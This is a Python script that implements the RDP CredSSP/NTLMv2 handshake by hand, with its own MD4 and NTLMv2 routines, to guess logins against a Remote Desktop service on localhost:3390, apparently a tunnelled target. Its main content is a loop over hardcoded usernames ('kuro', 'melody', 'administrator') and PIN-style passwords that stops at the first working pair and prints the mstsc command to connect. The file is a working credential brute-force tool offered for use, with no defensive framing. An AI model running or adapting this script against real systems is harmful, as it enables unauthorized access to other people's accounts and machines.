import socket
import struct
import ssl
import hmac
import os
import time

def md4(data):
    def left_rotate(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xffffffff
    
    def F(x, y, z):
        return (x & y) | (~x & z)
    
    def G(x, y, z):
        return (x & y) | (x & z) | (y & z)
    
    def H(x, y, z):
        return x ^ y ^ z
    
    msg = bytearray(data)
    msg_len = len(data)
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack('<Q', msg_len * 8)
    
    A, B, C, D = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    
    for i in range(0, len(msg), 64):
        block = msg[i:i+64]
        X = struct.unpack('<16I', block)
        
        AA, BB, CC, DD = A, B, C, D
        
        for j in range(16):
            if j < 4:
                k = j
            elif j < 8:
                k = (j - 4) * 4
            elif j < 12:
                k = (j - 8) * 4 + 1
            else:
                k = (j - 12) * 4 + 2
            k = j
            A = left_rotate((A + F(B, C, D) + X[k]) & 0xffffffff, [3,7,11,19][j%4])
            A, B, C, D = D, A, B, C
        
        for j in range(16):
            k = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]
            A = left_rotate((A + G(B, C, D) + X[k] + 0x5a827999) & 0xffffffff, [3,5,9,13][j%4])
            A, B, C, D = D, A, B, C
        
        for j in range(16):
            k = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]
            A = left_rotate((A + H(B, C, D) + X[k] + 0x6ed9eba1) & 0xffffffff, [3,9,11,15][j%4])
            A, B, C, D = D, A, B, C
        
        A = (A + AA) & 0xffffffff
        B = (B + BB) & 0xffffffff
        C = (C + CC) & 0xffffffff
        D = (D + DD) & 0xffffffff
    
    return struct.pack('<4I', A, B, C, D)

def ntlm_hash(password):
    return md4(password.encode('utf-16le'))

def ntlmv2_resp(nt_hash, user, domain, server_chal, client_chal, ts, target_info):
    ud = (user.upper() + domain.upper()).encode('utf-16le')
    v2hash = hmac.new(nt_hash, ud, 'md5').digest()
    blob = b'\x01\x01\x00\x00\x00\x00\x00\x00' + ts + client_chal + b'\x00\x00\x00\x00' + target_info + b'\x00\x00\x00\x00'
    proof = hmac.new(v2hash, server_chal + blob, 'md5').digest()
    return proof + blob

def try_auth(host, port, user, pwd, domain=""):
    print(f"[*] {user}:{pwd} @ {domain or 'local'}...", end=" ", flush=True)
    try:
        cookie = f"Cookie: mstshash={user}\r\n".encode()
        neg = bytes([0x01,0x00,0x08,0x00,0x03,0x00,0x00,0x00])
        x224 = bytes([0xe0,0,0,0,0,0]) + cookie + neg
        cr = bytes([0x03,0x00]) + struct.pack(">H", 5+len(x224)) + bytes([len(x224)]) + x224
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, port))
        sock.sendall(cr)
        resp = sock.recv(1024)
        if resp[5] != 0xd0:
            print("CONN REJECTED")
            return False
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(sock, server_hostname=host)
        
        ntlm_neg = b"NTLMSSP\x00\x01\x00\x00\x00\xb7\x82\x08\xe2" + b"\x00"*16 + b"\x0a\x00\x63\x45\x00\x00\x00\x0f"
        credssp = bytes([0x30,0x37,0xa0,0x03,0x02,0x01,0x06,0xa1,0x30,0x30,0x2e,0x30,0x2c,0xa0,0x2a,0x04,0x28]) + ntlm_neg
        ss.send(credssp)
        chalresp = ss.recv(4096)
        
        if b"NTLMSSP" not in chalresp:
            print("NO CHAL")
            return False
        
        idx = chalresp.find(b"NTLMSSP")
        nm = chalresp[idx:]
        schal = nm[24:32]
        ti_len = struct.unpack("<H", nm[40:42])[0]
        ti_off = struct.unpack("<I", nm[44:48])[0]
        ti = nm[ti_off:ti_off+ti_len]
        
        ts = None
        i = 0
        while i < len(ti)-4:
            aid = struct.unpack("<H", ti[i:i+2])[0]
            alen = struct.unpack("<H", ti[i+2:i+4])[0]
            if aid == 7: ts = ti[i+4:i+4+8]; break
            if aid == 0: break
            i += 4 + alen
        if not ts:
            ts = struct.pack("<Q", int(time.time()*10000000)+116444736000000000)
        
        nth = ntlm_hash(pwd)
        cchal = os.urandom(8)
        ntr = ntlmv2_resp(nth, user, domain, schal, cchal, ts, ti)
        lmr = cchal + b'\x00'*16
        
        db = domain.encode('utf-16le')
        ub = user.encode('utf-16le')
        wb = b'W\x00I\x00N\x00'
        
        off = 88
        am = b'NTLMSSP\x00\x03\x00\x00\x00'
        am += struct.pack('<HHI', len(lmr), len(lmr), off); off += len(lmr)
        am += struct.pack('<HHI', len(ntr), len(ntr), off); off += len(ntr)
        am += struct.pack('<HHI', len(db), len(db), off); off += len(db)
        am += struct.pack('<HHI', len(ub), len(ub), off); off += len(ub)
        am += struct.pack('<HHI', len(wb), len(wb), off); off += len(wb)
        am += struct.pack('<HHI', 0, 0, off)
        am += struct.pack('<I', 0xe2888215) + b'\x0a\x00\x63\x45\x00\x00\x00\x0f'
        am += lmr + ntr + db + ub + wb
        
        al = len(am)
        ca = bytes([0x30,0x82]) + struct.pack(">H", al+15)
        ca += bytes([0xa0,0x03,0x02,0x01,0x06,0xa2,0x82]) + struct.pack(">H", al+6)
        ca += bytes([0x30,0x82]) + struct.pack(">H", al+2)
        ca += bytes([0x04,0x82]) + struct.pack(">H", al) + am
        
        ss.send(ca)
        
        try:
            ar = ss.recv(4096)
            if len(ar) > 0:
                if ar[0] == 0x30 and b'\xa3' in ar[:30]:
                    print("SUCCESS!")
                    ss.close()
                    return True
                elif ar[0] == 0x30 and len(ar) > 50:
                    print(f"RESPONSE ({len(ar)}b)")
                    return "check"
                else:
                    print("REJECTED")
            else:
                print("NO RESP")
        except ssl.SSLError as e:
            if "internal" in str(e).lower():
                print("AUTH FAIL")
            else:
                print(f"SSL ERR")
        except:
            print("TIMEOUT")
        ss.close()
        return False
    except Exception as e:
        print(f"ERR: {str(e)[:30]}")
        return False

print("=== TESTING CREDENTIALS ===\n")

creds = [
    ("kuro", "1121", ""),
    ("kuro", "1121", "meltat0"),
    ("melody", "0114", ""),
    ("melody", "0441", ""),
    ("melody", "1140", ""),
    ("melody", "4410", ""),
    ("melody", "1121", ""),
    ("admin", "1121", ""),
    ("administrator", "1121", ""),
    ("melody", "melody", ""),
    ("kuro", "kuro", ""),
]

for u, p, d in creds:
    r = try_auth("localhost", 3390, u, p, d)
    if r == True:
        print(f"\n*** FOUND: {u}:{p} ***")
        print(f"*** RUN: mstsc /v:localhost:3390 ***")
        break
    time.sleep(0.3)
